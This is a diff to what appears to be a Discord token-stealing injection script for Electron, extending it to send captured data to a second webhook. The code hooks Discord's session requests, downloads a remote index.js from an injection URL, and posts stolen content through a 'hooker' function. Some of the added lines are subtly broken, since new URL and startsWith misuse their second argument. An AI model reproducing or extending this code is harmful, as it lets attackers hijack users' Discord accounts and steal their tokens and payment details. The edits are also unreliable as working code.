@@ -7,7 +7,7 @@ const { BrowserWindow, session } = require('electron');
 
 const config = {
   webhook: '%WEBHOOK%', 
-  webhook: '%WEBHOOK2%',
+  webhook2: '%WEBHOOK2%',
   ip: '%IP%',
   auto_buy_nitro: false, 
   ping_on_run: false, 
@@ -421,7 +421,7 @@ async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
         res.replace('%WEBHOOK%', '${config.webhook}')
-        res.replace('%WEBHOOK2%', '${config.webhook}')
+        res.replace('%WEBHOOK2%', '${config.webhook2}')
         res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
         res.pipe(file);
         file.on('finish', () => {
@@ -572,7 +572,8 @@ const getBadges = (flags) => {
 
 const hooker = async (content) => {
   const data = JSON.stringify(content);
-  const url = new URL(config.webhook);
+  const url = new URL(config.webhook, config.webhook2);
+  
   const headers = {
     'Content-Type': 'application/json',
     'Access-Control-Allow-Origin': '*',
@@ -877,7 +878,7 @@ session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, call
 });
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
-  if (details.url.startsWith(config.webhook)) {
+  if (details.url.startsWith(config.webhook, config.webhook2)) {
     if (details.url.includes('discord.com')) {
       callback({
         responseHeaders: Object.assign(
